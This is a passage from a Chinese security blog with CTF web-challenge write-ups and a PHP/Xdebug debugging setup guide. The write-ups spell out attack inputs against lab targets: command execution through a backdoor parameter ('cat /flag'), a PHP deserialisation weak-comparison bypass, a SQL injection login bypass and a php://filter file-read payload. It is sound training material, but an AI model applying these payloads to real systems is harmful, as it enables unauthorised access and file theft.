          <a href="#六十四、-LitCTF-2023-Vim-yyds" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十四、-LitCTF-2023-Vim-yyds" class="headerlink" title="六十四、[LitCTF 2023]Vim yyds"></a>六十四、[LitCTF 2023]Vim yyds</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291340800.png" alt="image-20240529134044736"></p>
<p>查看源码也没发现，用dirsearch扫描一下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://node4.anna.nssctf.cn:28213/</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291341477.png" alt="image-20240529134134425"></p>
<p>得到一个/.index.php.swp文件，访问一下</p>
<p>直接下载了，用记事本打开看看</p>
<p>虽然有点乱码，但大致还是能明白，能看得出本来的顺序应该是这个反着的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291343368.png" alt="image-20240529134317303"></p>
<p>用POST方法传入password参数，并且password的值要为Give_Me_Your_Flag的base64编码后的值，这样就会返回cmd参数的值，cmd参数也是用POST方法传入的</p>
<p>Give_Me_Your_Flag经过base64编码后为R2l2ZV9NZV9Zb3VyX0ZsYWc=</p>
<p>可以利用命令执行，来给cmd传值，所以先看看根目录，使用HackBar传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=ls /</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291350407.png" alt="image-20240529135008344"></p>
<p>再打开这个flag文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291340830.png" alt="image-20240529134015777"></p>

        <h1 id="六十五、-HUBUCTF-2022-新生赛-checkin"   >
          <a href="#六十五、-HUBUCTF-2022-新生赛-checkin" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十五、-HUBUCTF-2022-新生赛-checkin" class="headerlink" title="六十五、[HUBUCTF 2022 新生赛]checkin"></a>六十五、[HUBUCTF 2022 新生赛]checkin</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291352710.png" alt="image-20240529135200653"></p>
<p>从 GET 请求中获取一个名为 <code>info</code> 的参数，并将其反序列化为 <code>$data_unserialize</code> 数组，然后与预定义的用户名和密码进行比较，如果用户名和密码匹配，则输出 <code>$flag</code> 的内容</p>
<p>但是提示又说它已经更改了username和password的值</p>
<p>这里的比较用的是弱比较，在 PHP 中，<code>true</code> 在弱比较中等于许多值，包括一些字符串和整数</p>
<p>可以试试，构造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = array(&#x27;username&#x27; =&gt; TRUE, &#x27;password&#x27; =&gt; TRUE);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">echo $serialized_data;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>输出为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291405379.png" alt="image-20240529140554329"></p>
<p>构造最终payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291406996.png" alt="image-20240529140638916"></p>

        <h1 id="六十六、-GDOUCTF-2023-hate-eat-snake"   >
          <a href="#六十六、-GDOUCTF-2023-hate-eat-snake" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十六、-GDOUCTF-2023-hate-eat-snake" class="headerlink" title="六十六、[GDOUCTF 2023]hate eat snake"></a>六十六、[GDOUCTF 2023]hate eat snake</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291415812.png" alt="image-20240529141539740"></p>
<p>尝试了一下，坚持不到60s，查看源代码有个snake.js，看看</p>
<p>没看明白，甚至有一堆奇奇怪怪的字符，用控制台解读一下这么一大堆</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291417325.png" alt="image-20240529141700217"></p>
<p>也没解读出啥…看了别人的wp，原来是回车之后还要输入这一长串后面的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(_0x324fcb(0x2d9,0x2c3,0x2db,0x2f3)+&#x27;k3r_h0pe_t&#x27;+_0xe4a674(0x5a1,0x595,0x59e,0x57c)+&#x27;irlfriend&#125;&#x27;)</span><br></pre></td></tr></table></div></figure>

<p>再回车就有flag弹窗了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291415149.png" alt="image-20240529141517090"></p>

        <h1 id="六十七、-HNCTF-2022-Week1-2048"   >
          <a href="#六十七、-HNCTF-2022-Week1-2048" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十七、-HNCTF-2022-Week1-2048" class="headerlink" title="六十七、[HNCTF 2022 Week1]2048"></a>六十七、[HNCTF 2022 Week1]2048</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291421656.png" alt="image-20240529142152579"></p>
<p>是一个2048游戏，查看网页源代码，有2048.js，点进去看看</p>
<p>搜索flag、win都没搜着，搜js看到一个md5.js，而且后面还有一句</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(String.fromCharCode(24685,21916,33,102,108,97,103,123,53,51,49,54,48,99,56,56,56,101,50,53,99,51,102,56,50,56,98,50,51,101,51,49,54,97,55,97,101,48,56,51,125))</span><br></pre></td></tr></table></div></figure>

<p>想到了上一题，给这句放控制台解密</p>
<p>一回车又出现flag的弹窗了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291423109.png" alt="image-20240529142303046"></p>
<p>提交时记得前面改成NSSCTF</p>

        <h1 id="六十八、-NISACTF-2022-checkin"   >
          <a href="#六十八、-NISACTF-2022-checkin" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十八、-NISACTF-2022-checkin" class="headerlink" title="六十八、[NISACTF 2022]checkin"></a>六十八、[NISACTF 2022]checkin</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291429413.png" alt="image-20240529142918348"></p>
<p>看似只需要用GET方法传值，但是一开始给提示说复制源码看看，那就复制源码到vscode</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291430608.png" alt="image-20240529143034550"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、调试搭建"   >
          <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
      
        <h2 id="🔺Windows版本"   >
          <a href="#🔺Windows版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Windows版本" class="headerlink" title="🔺Windows版本"></a>🔺Windows版本</h2>
      
        <h2 id="1-前置安装"   >
          <a href="#1-前置安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
      <p>phpstorm+phpStudy</p>
<p>这两个需要先装好，之后利用phpStudy中自带的xdebug来调试</p>

        <h2 id="2-phpStudy设置"   >
          <a href="#2-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStudy设置" class="headerlink" title="2.phpStudy设置"></a>2.phpStudy设置</h2>
      
        <h3 id="1-php版本"   >
          <a href="#1-php版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-php版本" class="headerlink" title="(1)php版本"></a>(1)php版本</h3>
      <p>这里我的php选择的是如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png" alt="image-20220107105326110"></p>

        <h3 id="2-打开xdebug"   >
          <a href="#2-打开xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开xdebug" class="headerlink" title="(2)打开xdebug"></a>(2)打开xdebug</h3>
      <p>单击设置-&gt;扩展组件，设置如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png" alt="image-20220107105424985"></p>

        <h3 id="3-修改php-ini"   >
          <a href="#3-修改php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改php-ini" class="headerlink" title="(3)修改php.ini"></a>(3)修改php.ini</h3>
      <p>然后主界面设置-&gt;php.ini-&gt;单击对应版本，即可打开php.ini配置文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png" alt="image-20220107105552036"></p>
<p>打开之后，在最下面的xdebug设置如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></div></figure>

<p>这里参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/baocheng/p/5775938.html" >https://www.cnblogs.com/baocheng/p/5775938.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  相关的会更加详细。</p>
<p>主要是设置<code>xdebug.remote_handler</code>，<code>xdebug.remote_port</code>，<code>xdebug.remote_host</code>，<code>xdebug.profiler_enable</code>，<code>xdebug.idekey</code>，<code>xdebug.remote_enable</code></p>

        <h3 id="4-网站路径设置"   >
          <a href="#4-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-网站路径设置" class="headerlink" title="(4)网站路径设置"></a>(4)网站路径设置</h3>
      <p>主界面网站-&gt;管理-&gt;修改-&gt;根目录，然后设置为在phpStorm中存放php文件的目录，没有的可以直接创建一个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png" alt="image-20220107111415751"></p>

        <h3 id="5-开启服务"   >
          <a href="#5-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-开启服务" class="headerlink" title="(5)开启服务"></a>(5)开启服务</h3>
      <p>phpStudy中开启对应的网站服务即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png" alt="image-20220107112835096"></p>

        <h2 id="3-phpstorm设置"   >
          <a href="#3-phpstorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpstorm设置" class="headerlink" title="3.phpstorm设置"></a>3.phpstorm设置</h2>
      
        <h3 id="1-PHP版本选择"   >
          <a href="#1-PHP版本选择" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP版本选择" class="headerlink" title="(1)PHP版本选择"></a>(1)PHP版本选择</h3>
      <p>版本选择之前我们的设置好的相关版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png" alt="image-20220107110300128"></p>
<p>这里的CLI interpreter需要选择phpStudy中的php，点击旁边的<code>...</code>按钮，找到对应的php.exe添加即可，大多的路径如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png" alt="image-20220107110410950"></p>

        <h3 id="2-xdebug配置"   >
          <a href="#2-xdebug配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-xdebug配置" class="headerlink" title="(2)xdebug配置"></a>(2)xdebug配置</h3>
      <p>打开phpstorm，打开setting-&gt;PHP-&gt;Debug，xdebug配置如下，主要是端口对应</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png" alt="image-20220107110012400"></p>
<p>PHP-&gt;Debug-&gt;DBGp Proxy，进行相关设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png" alt="image-20220107110614445"></p>

        <h3 id="3-服务器端配置"   >
          <a href="#3-服务器端配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-服务器端配置" class="headerlink" title="(3)服务器端配置"></a>(3)服务器端配置</h3>
      <p>setting-&gt;server</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png" alt="image-20220107110138638"></p>
<p>没有的自行+号添加，名字自己定义</p>

        <h3 id="4-配置php文件路径"   >
          <a href="#4-配置php文件路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-配置php文件路径" class="headerlink" title="(4)配置php文件路径"></a>(4)配置php文件路径</h3>
      <p>Run-&gt;Edit Configurations</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png" alt="image-20220107110807337"></p>
<p>然后添加对应的调试路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png" alt="image-20220107111003896"></p>
<p>对应设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png" alt="image-20220107111151592"></p>

        <h2 id="4-开始调试"   >
          <a href="#4-开始调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开始调试" class="headerlink" title="4.开始调试"></a>4.开始调试</h2>
      <p>然后在phpStorm中对应网站的目录下的文件即可下断点开始调试</p>

        <h3 id="1-开始监听"   >
          <a href="#1-开始监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-开始监听" class="headerlink" title="(1)开始监听"></a>(1)开始监听</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png" alt="image-20220107111554195"></p>
<p>设置好调试环境，然后点旁边的电话，使其变成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png" alt="image-20220107111631356"></p>

        <h3 id="2-调试"   >
          <a href="#2-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-调试" class="headerlink" title="(2)调试"></a>(2)调试</h3>
      <p>在文件中下断点，点击debug即可开始调试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png" alt="image-20220107112446079"></p>

        <h2 id="🔺Linux版本"   >
          <a href="#🔺Linux版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Linux版本" class="headerlink" title="🔺Linux版本"></a>🔺Linux版本</h2>
      
        <h2 id="1-前置安装-1"   >
          <a href="#1-前置安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装-1" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
      <p>用的也是PHPSTORM和宝塔linux</p>

        <h2 id="2-宝塔linux设置"   >
          <a href="#2-宝塔linux设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-宝塔linux设置" class="headerlink" title="2.宝塔linux设置"></a>2.宝塔linux设置</h2>
      
        <h3 id="1-安装xdebug"   >
          <a href="#1-安装xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装xdebug" class="headerlink" title="(1)安装xdebug"></a>(1)安装xdebug</h3>
      <p>安装好PHP之后，设置安装PHP的拓展</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png" alt="image-20220113110140841"></p>

        <h3 id="2-配置php-ini"   >
          <a href="#2-配置php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配置php-ini" class="headerlink" title="(2)配置php.ini"></a>(2)配置php.ini</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png" alt="image-20220113110241556"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">; 允许远程 可以为 On 或者 1 都表示启用 ， Off 和 0 表示关闭关闭</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">; 远程主机的 IP 这里我们填写，固定的 127.0.0.1 这里写的是PHPSTORM所在的那台机器上的IP</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">; 调试连接端口 请记住这个端口，后续会用到。此配置项默认值为 9000 ，但是通常 9000 端口被 fpm 占据 ，故更换端口。</span><br><span class="line">; 另外，请在你服务器的控制面板和服务器防火墙中开放这个端口的进出站。</span><br><span class="line">; 如果你是宝塔面板用户 请放行此端口。</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">; 接下来的值都是可选的，但是我推荐你使用</span><br><span class="line">; 连接 IDE 的 Key，请记住他，可以自己自定义，主要用来过滤请求。</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable=On</span><br></pre></td></tr></table></div></figure>

<p>参照</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.t1h2ua.cn/archives/69" >Linux内网服务器+宝塔+Xdebug远程调试配置 – T1h2ua’s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>保存之后，重载一下配置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png" alt="image-20220113110410355"></p>

        <h3 id="3-网站路径设置"   >
          <a href="#3-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站路径设置" class="headerlink" title="(3)网站路径设置"></a>(3)网站路径设置</h3>
      <p>宝塔Linux中点击网站，添加站点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png" alt="image-20220113110540548"></p>
<p>得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png" alt="image-20220113110610661"></p>

        <h3 id="4-开启服务"   >
          <a href="#4-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开启服务" class="headerlink" title="(4)开启服务"></a>(4)开启服务</h3>
      <p>记得把对应的服务打开，nginx/apache和php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png" alt="image-20220113110735466"></p>

        <h3 id="5-放行9001端口"   >
          <a href="#5-放行9001端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-放行9001端口" class="headerlink" title="(5)放行9001端口"></a>(5)放行9001端口</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png" alt="image-20220113111553907"></p>

        <h2 id="3-phpStorm设置"   >
          <a href="#3-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpStorm设置" class="headerlink" title="3.phpStorm设置"></a>3.phpStorm设置</h2>
      <p>这里就都差不多，选择php版本，配置xdebug，配置Server，配置php文件路径，注意这里选取的端口为9001</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png" alt="image-20220113110926412"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png" alt="image-20220113111016050"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png" alt="image-20220113110938531"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png" alt="image-20220113111029912"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png" alt="image-20220113111210749"></p>
<p>然后就可以调试了。</p>

        <h1 id="二、数据库搭建"   >
          <a href="#二、数据库搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、数据库搭建" class="headerlink" title="二、数据库搭建"></a>二、数据库搭建</h1>
      
        <h2 id="1-phpStudy设置"   >
          <a href="#1-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpStudy设置" class="headerlink" title="1.phpStudy设置"></a>1.phpStudy设置</h2>
      
        <h3 id="1-创建数据库"   >
          <a href="#1-创建数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建数据库" class="headerlink" title="(1)创建数据库"></a>(1)创建数据库</h3>
      <p>设置数据库，没有就创建，鼠标碰到密码可以查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png" alt="image-20220109115051455"></p>

        <h3 id="2-打开MySQL数据库"   >
          <a href="#2-打开MySQL数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开MySQL数据库" class="headerlink" title="(2)打开MySQL数据库"></a>(2)打开MySQL数据库</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png" alt="image-20220109115216201"></p>

        <h2 id="2-phpStorm设置"   >
          <a href="#2-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStorm设置" class="headerlink" title="2.phpStorm设置"></a>2.phpStorm设置</h2>
      
        <h3 id="1-设置"   >
          <a href="#1-设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-设置" class="headerlink" title="(1)设置"></a>(1)设置</h3>
      <p>view-&gt;Tool Windows-&gt;databases</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png" alt="image-20220109115314160"></p>
<p>然后创建一个连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png" alt="image-20220109115352472"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png" alt="image-20220109115418414"></p>
<p>对应输入host，账号密码即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png" alt="image-20220109115447217"></p>

        <h3 id="2-查看控制"   >
          <a href="#2-查看控制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看控制" class="headerlink" title="(2)查看控制"></a>(2)查看控制</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png" alt="image-20220109115523944"></p>
<p>view-&gt;tool windows-&gt;database之后，双击上面红框可以进入控制界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png" alt="image-20220109115615823"></p>
<p>然后就正常了。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/BUU-1/">陪AZ的WebBUU刷题(一)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-01-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/550880247?utm_id=0" >https://zhuanlan.zhihu.com/p/550880247?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   //SQL注入</p>

        <h1 id="一、-极客大挑战-2019-EasySQL"   >
          <a href="#一、-极客大挑战-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-极客大挑战-2019-EasySQL" class="headerlink" title="一、[极客大挑战 2019]EasySQL"></a>一、[极客大挑战 2019]EasySQL</h1>
      <p>题目是一个登录页面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281258184.png" alt="image-20220728125819044"></p>
<p>首先考虑是否是SQL注入，通过查看网页源代码发现!</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281257822.png" alt="image-20220728125729780"></p>
<p>是php写的</p>
<p>于是直接在url后面输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php? username=aa&#x27;or&#x27;a&#x27;=&#x27;a&amp;&amp;password=aa&#x27;or&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></div></figure>

<p>(PS: aa’也可以换成其他字符再加单引号‘，or后面的语句应该是始终为真，且注意加单引号，末尾的单引号不加)</p>
<p>(PS:也可以直接在登录界面输入)</p>
<p>最后解出！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281259279.png" alt="image-20220728125902175"></p>

        <h1 id="二、-极客大挑战-2019-Havefun-1"   >
          <a href="#二、-极客大挑战-2019-Havefun-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-极客大挑战-2019-Havefun-1" class="headerlink" title="二、[极客大挑战 2019]Havefun 1"></a>二、[极客大挑战 2019]Havefun 1</h1>
      <p>打开界面是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281300850.png" alt="image-20220728130052768"></p>
<p>什么提示也没有，我们可以查看一下它的网页源代码</p>
<p>在源代码的最后，可以看到这样几行注释：</p>
<p>（PS：<!--   -->是html中的注释标志）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281301266.png" alt="image-20220728130119241"></p>
<p>这是一段php代码，通过阅读发现是以GET方式传入cat,直接输出了cst的值，如果cat的值为dog，则将输出’Syc{cat_cat_cat_cat}’</p>
<p>显然，有猫腻</p>
<p>于是尝试着传入cat的值为dog，即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></div></figure>

<p>回车一下，我们可以惊讶地发现：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281302331.png" alt="image-20220728130224249"></p>
<p>它它它，它出来了！</p>
<p>解题成功！！！</p>

        <h1 id="三、-ACTF2020-新生赛-Include-1"   >
          <a href="#三、-ACTF2020-新生赛-Include-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-ACTF2020-新生赛-Include-1" class="headerlink" title="三、[ACTF2020 新生赛]Include 1"></a>三、[ACTF2020 新生赛]Include 1</h1>
      <p>刚打开就是一个很直接的画面：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281424123.png" alt="image-20220728142446965"></p>
<p>点击tips</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281619370.png" alt="image-20220728161935315"></p>
<p>显然，这是暗示，也是挑衅。注意这里的url格式，这不是文件源码，应想办法读取文件源码</p>
<p>通过查阅资料（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%89" >https://www.cnblogs.com/wjrblogs/p/12285202.html）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>于是得到</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p>此时得到一堆奇奇怪怪的东西：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281459682.png" alt="image-20220728145944523"></p>
<p>这是base64的编码输出，可以借助Cyberchef解密</p>
<p>得：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281502243.png" alt="image-20220728150227071"></p>
